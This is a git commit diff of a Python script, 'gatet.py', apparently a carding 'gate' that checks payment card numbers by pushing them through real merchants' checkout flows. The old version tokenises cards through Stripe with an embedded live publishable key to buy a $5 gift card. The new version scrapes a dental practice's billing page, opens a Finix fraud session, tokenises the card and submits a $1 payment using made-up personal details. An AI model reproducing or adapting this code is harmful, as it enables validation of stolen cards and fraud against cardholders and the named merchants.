f0188c8a314d497ec001eeda9c513c0c903d1203
Rodamuser08 <rodamuser08@gmail.com>
2025-05-12 05:50:49 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -27,34 +27,95 @@ def Tele(ccx):
 		yy = yy.split("20")[1]
 
 	headers = {
-	    'authority': 'api.stripe.com',
-	    'accept': 'application/json',
+	    'authority': 'app.thebilling.company',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'application/x-www-form-urlencoded',
-	    'origin': 'https://js.stripe.com',
-	    'referer': 'https://js.stripe.com/',
+	    'cache-control': 'max-age=0',
+	    'referer': 'https://www.google.com/',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'document',
+	    'sec-fetch-mode': 'navigate',
+	    'sec-fetch-site': 'same-origin',
+	    'sec-fetch-user': '?1',
+	    'upgrade-insecure-requests': '1',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	}
+	
+	response = session.get('https://app.thebilling.company/makdentalgroup-eaton/payment-link', headers=headers)
+	
+	merchantId = re.search(r'"merchantId":"(.*?)"', response.text).group(1)
+	appId = re.search(r'"appId":"(.*?)"', response.text).group(1)
+	
+	headers = {
+	    'authority': 'finix.live-payments-api.com',
+	    'accept': 'application/json, text/plain, */*',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'origin': 'https://app.thebilling.company',
+	    'referer': 'https://app.thebilling.company/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
 	    'sec-fetch-dest': 'empty',
 	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-site',
+	    'sec-fetch-site': 'cross-site',
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F9e39ef88d1%3B+stripe-js-v3%2F9e39ef88d1%3B+card-element&key=pk_live_7ah6gSa8oGIcTyDOseamKDhP00cU80tIPI'
+	params = {
+	    'merchant_id': f'{merchantId}',
+	}
 	
-	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	response = session.get('https://finix.live-payments-api.com/fraud/sessions', params=params, headers=headers)
 	
-	pm = response.json()['id']
+	session_id = response.json()['session_id']
 	
 	headers = {
-	    'authority': 'startplaying.games',
+	    'authority': 'internal.live-payments-api.com',
+	    'accept': 'application/json, text/plain, */*',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'content-type': 'application/json',
+	    'origin': 'https://js.finix.com',
+	    'referer': 'https://js.finix.com/',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'cross-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	}
+	
+	json_data = {
+	    'type': 'PAYMENT_CARD',
+	    'country': 'USA',
+	    'currency': 'USD',
+	    'number': f'{n}',
+	    'expiration_month': mm,
+	    'expiration_year': yy,
+	    'security_code': f'{cvc}',
+	    'address': {
+	        'postal_code': '10080',
+	        'country': 'USA',
+	    },
+	}
+	
+	response = session.post(
+	    f'https://internal.live-payments-api.com/applications/{appId}/tokens',
+	    headers=headers,
+	    json=json_data,
+	)
+	
+	tok = response.json()['id']
+	
+	headers = {
+	    'authority': 'app.thebilling.company',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/json',
-	    'origin': 'https://startplaying.games',
-	    'referer': 'https://startplaying.games/gift-card',
+	    'origin': 'https://app.thebilling.company',
+	    'referer': 'https://app.thebilling.company/makdentalgroup-eaton/payment-link',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -64,22 +125,32 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	json_data = {
-	    'operationName': 'PurchaseGiftCardMutation',
-	    'variables': {
-	        'input': {
-	            'credit': 5,
-	            'email': 'rodamuser08@gmail.com',
-	            'name': 'Elody',
-	            'reason': 'Enjoy!!',
-	            'recipientEmail': 'rodamuser09@gmail.com',
-	            'recipientName': 'Rosy',
-	            'stripePaymentMethodId': f'{pm}',
-	        },
-	    },
-	    'query': 'mutation PurchaseGiftCardMutation($input: CreateGiftCardTransactionInput!) {\n  createGiftCardTransaction(input: $input) {\n    id\n    amount\n    created\n    credit\n    modified\n    payoutDate\n    player {\n      id\n      name\n      __typename\n    }\n    reason\n    relatedUser {\n      id\n      name\n      __typename\n    }\n    slug\n    stripePaymentId\n    type\n    __typename\n  }\n}',
+	params = {
+	    'batch': '1',
 	}
 	
-	response = session.post('https://startplaying.games/api/graphql', headers=headers, json=json_data)
+	json_data = {
+	    '0': {
+	        'json': {
+	            'amount': 1,
+	            'firstName': 'Rodam',
+	            'lastName': 'User',
+	            'dob': '10/03/2001',
+	            'email': 'rodamuser08@gmail.com',
+	            'phone': '(430)300-0850',
+	            'note': '',
+	            'officeId': 132,
+	            'token': f'{tok}',
+	            'sessionId': f'{session_id}',
+	        },
+	    },
+	}
+	
+	response = session.post(
+	    'https://app.thebilling.company/api/trpc/viewer.payments.processOnlinePayment',
+	    params=params,
+	    headers=headers,
+	    json=json_data,
+	)
 	
 	return (response.text)
